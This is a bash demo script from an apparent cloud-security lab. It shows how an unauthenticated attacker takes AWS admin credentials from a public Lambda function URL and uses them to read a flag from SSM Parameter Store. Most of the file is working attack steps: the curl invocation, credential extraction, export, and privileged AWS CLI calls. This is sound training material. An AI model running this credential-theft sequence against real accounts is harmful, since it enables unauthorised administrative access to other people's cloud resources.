#!/bin/bash

# Demo script for public Lambda with admin role toxic combination
# This script demonstrates how an unauthenticated attacker can obtain AWS admin credentials
# by invoking a Lambda function URL with AuthorizationType: NONE and extracting the
# execution role's temporary credentials from the function's HTTP response.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it (read-only/observation steps)
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Public Lambda with Admin Role Toxic Combination Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_cspm_toxic_combo_public_lambda_with_admin.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

LAMBDA_FUNCTION_URL=$(echo "$MODULE_OUTPUT" | jq -r '.lambda_function_url')
LAMBDA_FUNCTION_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.lambda_function_name')
FLAG_SSM_PARAMETER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.flag_ssm_parameter_name')

if [ "$LAMBDA_FUNCTION_URL" == "null" ] || [ -z "$LAMBDA_FUNCTION_URL" ]; then
    echo -e "${RED}Error: Could not extract Lambda function URL from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Lambda function: $LAMBDA_FUNCTION_NAME"
echo "Lambda URL: $LAMBDA_FUNCTION_URL"
echo "Flag SSM parameter: $FLAG_SSM_PARAMETER_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

export AWS_REGION=$AWS_REGION

echo -e "${BLUE}i Attack Simulation Note:${NC}"
echo -e "${BLUE}  This attack requires no AWS credentials. The Lambda function URL has${NC}"
echo -e "${BLUE}  AuthorizationType: NONE, so any HTTP client can invoke it. The function${NC}"
echo -e "${BLUE}  exposes the execution role's temporary credentials in its response.${NC}"
echo ""

# [EXPLOIT] Step 2: Invoke the public Lambda function URL (no credentials required)
echo -e "${YELLOW}Step 2: Invoking the public Lambda function URL${NC}"
echo "The function URL has AuthorizationType: NONE — no AWS credentials required."
echo "Sending unauthenticated HTTP request..."

show_attack_cmd "Attacker (unauthenticated)" "curl -s \"$LAMBDA_FUNCTION_URL\""
LAMBDA_RESPONSE=$(curl -s "$LAMBDA_FUNCTION_URL")

if [ -z "$LAMBDA_RESPONSE" ]; then
    echo -e "${RED}Error: No response from Lambda function URL${NC}"
    exit 1
fi

echo "Lambda response received:"
echo "$LAMBDA_RESPONSE" | jq . 2>/dev/null || echo "$LAMBDA_RESPONSE"
echo -e "${GREEN}✓ Successfully invoked Lambda function without credentials${NC}\n"

# [EXPLOIT] Step 3: Extract the admin role credentials from the response
echo -e "${YELLOW}Step 3: Extracting admin role credentials from Lambda response${NC}"
echo "The Lambda runtime injects execution role credentials as environment variables."
echo "Parsing AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from response..."

LAMBDA_ACCESS_KEY_ID=$(echo "$LAMBDA_RESPONSE" | jq -r '.AWS_ACCESS_KEY_ID // empty')
LAMBDA_SECRET_ACCESS_KEY=$(echo "$LAMBDA_RESPONSE" | jq -r '.AWS_SECRET_ACCESS_KEY // empty')
LAMBDA_SESSION_TOKEN=$(echo "$LAMBDA_RESPONSE" | jq -r '.AWS_SESSION_TOKEN // empty')

if [ -z "$LAMBDA_ACCESS_KEY_ID" ] || [ -z "$LAMBDA_SECRET_ACCESS_KEY" ] || [ -z "$LAMBDA_SESSION_TOKEN" ]; then
    echo -e "${RED}Error: Could not extract credentials from Lambda response${NC}"
    echo "The Lambda function did not return credentials in the expected format."
    echo "Expected response keys: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN"
    exit 1
fi

echo "Extracted credentials:"
echo "  AWS_ACCESS_KEY_ID: ${LAMBDA_ACCESS_KEY_ID:0:10}..."
echo "  AWS_SESSION_TOKEN: ${LAMBDA_SESSION_TOKEN:0:20}..."
echo -e "${GREEN}✓ Extracted admin role credentials from Lambda response${NC}\n"

# Set extracted credentials
export AWS_ACCESS_KEY_ID="$LAMBDA_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$LAMBDA_SECRET_ACCESS_KEY"
export AWS_SESSION_TOKEN="$LAMBDA_SESSION_TOKEN"

# [EXPLOIT] Step 4: Verify the extracted credentials grant admin access
echo -e "${YELLOW}Step 4: Verifying admin role identity${NC}"
show_attack_cmd "Attacker (as lambda-admin-role)" "aws sts get-caller-identity"
CALLER_IDENTITY=$(aws sts get-caller-identity 2>&1)
echo "$CALLER_IDENTITY" | jq . 2>/dev/null || echo "$CALLER_IDENTITY"

ROLE_ARN=$(echo "$CALLER_IDENTITY" | jq -r '.Arn // empty' 2>/dev/null)
if [ -z "$ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not verify identity with extracted credentials${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed operating as: $ROLE_ARN${NC}\n"

# [EXPLOIT] Step 5: Capture the CTF flag
# The Lambda execution role has AdministratorAccess, which grants ssm:GetParameter
# implicitly. Use the extracted credentials to read the scenario flag from SSM Parameter Store.
echo -e "${YELLOW}Step 5: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="$FLAG_SSM_PARAMETER_NAME"
show_attack_cmd "Attacker (as lambda-admin-role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Obtained Lambda function URL from Terraform output (simulating recon)"
echo "2. Invoked the function URL unauthenticated (AuthorizationType: NONE)"
echo "3. Extracted admin role temporary credentials from the HTTP response"
echo "4. Verified identity as: $ROLE_ARN"
echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  Public Internet (unauthenticated)"
echo -e "  → (lambda:InvokeFunctionUrl, no auth) → Lambda function URL"
echo -e "  → Credential extraction → pl-lambda-admin-role (AdministratorAccess)"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
